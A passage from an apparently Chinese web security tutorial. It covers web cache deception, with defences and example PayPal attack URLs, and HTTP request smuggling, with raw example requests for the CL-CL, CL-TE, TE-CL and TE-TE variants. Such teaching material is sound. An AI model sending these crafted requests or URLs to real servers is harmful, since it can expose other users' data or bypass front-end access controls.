功能根据扩展进行保存，并忽略 caching header;</span></li><li><span>当访问如 </span><a href='http://www.example.com/home.php/non-existent.css' target='_blank' class='url'>http://www.example.com/home.php/non-existent.css</a><span> 不存在的页面，会返回 home.php 的内容。</span></li></ol><h3 id='4165--漏洞防御'><span>4.16.5  漏洞防御</span></h3><blockquote><p><span>防御措施主要包括 3 点：</span></p></blockquote><ol start='' ><li><span>设置缓存机制，仅仅缓存 http caching header 允许的文件，这能从根本上杜绝该问题;</span></li><li><span>如果缓存组件提供选项，设置为根据 content-type 进行缓存;</span></li><li><span>访问 </span><a href='http://www.example.com/home.php/non-existent.css' target='_blank' class='url'>http://www.example.com/home.php/non-existent.css</a><span> 这类不存在页面，不返回 home.php 的内容，而返回 404 或者 302。</span></li></ol><h3 id='4166--web-cache-欺骗攻击实例'><span>4.16.6  Web Cache 欺骗攻击实例</span></h3><h4 id='paypal'><span>Paypal</span></h4><blockquote><p><span>Paypal 在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后 4 位数、交易数据、emaill 地址等信息。受该攻击的部分页面包括：</span></p></blockquote><ul><li><a href='http://www.paypal.com/myaccount/home/attack.css'><span>https://www.paypal.com/myaccount/home/attack.css</span></a></li><li><a href='http://www.paypal.com/myaccount/settings/notifications/attack.css'><span>https://www.paypal.com/myaccount/settings/notifications/attack.css</span></a></li><li><a href='https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=' target='_blank' class='url'>https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=</a><span>_</span><span>history-details 。</span></li></ul><h3 id='4167--参考链接'><span>4.16.7  参考链接</span></h3><ul><li><a href='https://portswigger.net/blog/practical-web-cache-poisoning'><span>practical web cache poisoning</span></a></li><li><a href='https://www.usenix.org/conference/usenixsecurity18/presentation/hao'><span>End-Users Get Maneuvered: Empirical Analysis of Redirection Hijacking in Content Delivery Networks</span></a></li></ul><p>&nbsp;</p><h2 id='417--http-请求走私'><span>4.17  HTTP 请求走私</span></h2><h3 id='4171--简介'><span>4.17.1  简介</span></h3><blockquote><p><span>HTTP 请求走私是一种干扰网站处理 HTTP 请求序列方式的技术，最早在 2005 年的一篇 </span><a href='https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf'><span>文章</span></a><span> 中被提出。</span></p></blockquote><h3 id='4172--成因'><span>4.17.2  成因</span></h3><blockquote><p><span>请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置，即 Content-Length 和 Transfer-Encoding 标头。</span></p></blockquote><h3 id='4173--分类'><span>4.17.3  分类</span></h3><ul><li><span>CLTE：前端服务器使用 Content-Length 头，后端服务器使用 Transfer-Encoding 头</span></li><li><span>TECL：前端服务器使用 Transfer-Encoding 标头，后端服务器使用 Content-Length 标头。</span></li><li><span>TETE：前端和后端服务器都支持 Transfer-Encoding 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。</span></li></ul><h3 id='4174--攻击'><span>4.17.4  攻击</span></h3><h4 id='cl-不为-0-的-get-请求'><span>CL 不为 0 的 GET 请求</span></h4><blockquote><p><span>当前端服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉</span></p><p><span>GET 请求中的 Content-Length 头，不进行处理。例如下面这个例子：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="http"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="http"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>7</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">GET</span> <span class="cm-string-2">/</span> <span class="cm-error">HTTP/1.1\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Host:</span><span class="cm-string"> example.com\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Content-Length:</span><span class="cm-string"> 44\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GET /secret HTTP/1.1\r\n</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host: example.com\r\n</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">\r\n</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 159px;"></div><div class="CodeMirror-gutters" style="height: 159px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>前端服务器处理了 Content-Length ，而后端服务器没有处理 Content-Length ，基于 pipeline 机制认为这是两个独立的请求，就造成了漏洞的发生。</span></p></blockquote><h4 id='cl-cl'><span>CL-CL</span></h4><blockquote><p><span>根据 RFC 7230，当服务器收到的请求中包含两个 Content-Length ，而 两者的值不同时，需要返回 400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 Content-Length 值时，就会出现漏洞。例如：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="HTTP"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="http"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>7</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">POST</span> <span class="cm-string-2">/</span> <span class="cm-error">HTTP/1.1\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Host:</span><span class="cm-string"> example.com\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Content-Length:</span><span class="cm-string"> 8\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Content-Length:</span><span class="cm-string"> 7\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">12345\r\n</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">a</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 159px;"></div><div class="CodeMirror-gutters" style="height: 159px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>这个例子中 a 就会被带入下一个请求，变为 aGET / HTTP/1.1</span><span>\</span><span>r</span><span>\</span><span>n 。</span></p></blockquote><h4 id='cl-te'><span>CL-TE</span></h4><blockquote><p><span>CL-TE 指前端服务器处理 Content-Length 这一请求头，而后端服务器遵守 RFC2616 的规定，忽略掉</span></p><p><span>Content-Length ，处理 Transfer-Encoding 。例如：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="HTTP"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="http"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>10</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">POST</span> <span class="cm-string-2">/</span> <span class="cm-error">HTTP/1.1\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Host:</span><span class="cm-string"> example.com\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">...</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Connection:</span><span class="cm-string"> keep-alive\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Content-Length:</span><span class="cm-string"> 6\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Transfer-Encoding:</span><span class="cm-string"> chunked\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">0\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">a</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 227px;"></div><div class="CodeMirror-gutters" style="height: 227px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></blockquote><blockquote><p><span>这个例子中 a 同样会被带入下一个请求，变为 aGET / HTTP/1.1</span><span>\</span><span>r</span><span>\</span><span>n 。</span></p></blockquote><h4 id='te-cl'><span>TE-CL</span></h4><blockquote><p><span>TE-CL 指前端服务器处理 Transfer-Encoding 请求头，而后端服务器处理 Content-Length 请求头。例如：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="HTTP"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="http"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>11</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">POST</span> <span class="cm-string-2">/</span> <span class="cm-error">HTTP/1.1\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Host:</span><span class="cm-string"> example.com\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">...</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Content-Length:</span><span class="cm-string"> 4\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Transfer-Encoding:</span><span class="cm-string"> chunked\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">12\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">aPOST / HTTP/1.1\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">0\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">\r\n</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 249px;"></div><div class="CodeMirror-gutters" style="height: 249px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></blockquote><h4 id='te-te'><span>TE-TE</span></h4><blockquote><p><span>TE-TE 指前后端服务器都处理 Transfer-Encoding 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 Transfer-encoding ，测试例如：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="HTTP" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="http"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>15</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">POST</span> <span class="cm-string-2">/</span> <span class="cm-error">HTTP/1.1\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Host:</span><span class="cm-string"> example.com\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">...</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Content-length:</span><span class="cm-string"> 4\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Transfer-Encoding:</span><span class="cm-string"> chunked\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Transfer-encoding:</span><span class="cm-string"> cow\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">5c\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">aPOST / HTTP/1.1\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Content-Type:</span><span class="cm-string"> application/x-www-form-urlencoded\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">Content-Length:</span><span class="cm-string"> 15\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">x=1\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">0\r\n</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">\r\n</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 340px;"></div><div class="CodeMirror-gutters" style="height: 340px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></blockquote><h3 id='4175--防御'><span>4.17.5  防御</span></h3><ul><li><span>禁用后端连接重用</span></li><li><span>确保连接中的所有服务器具有相同的配置</span></li><li><span>拒绝有二义性的请求</span></li></ul><h3 id='4176--参考链接'><span>4.17.6  参考链接</span></h3><h4 id='rfc-6'><span>RFC</span></h4><ul><li><a href='https://tools.ietf.org/html/rfc2616'><span>RFC 2616 Hypertext Transfer Protocol 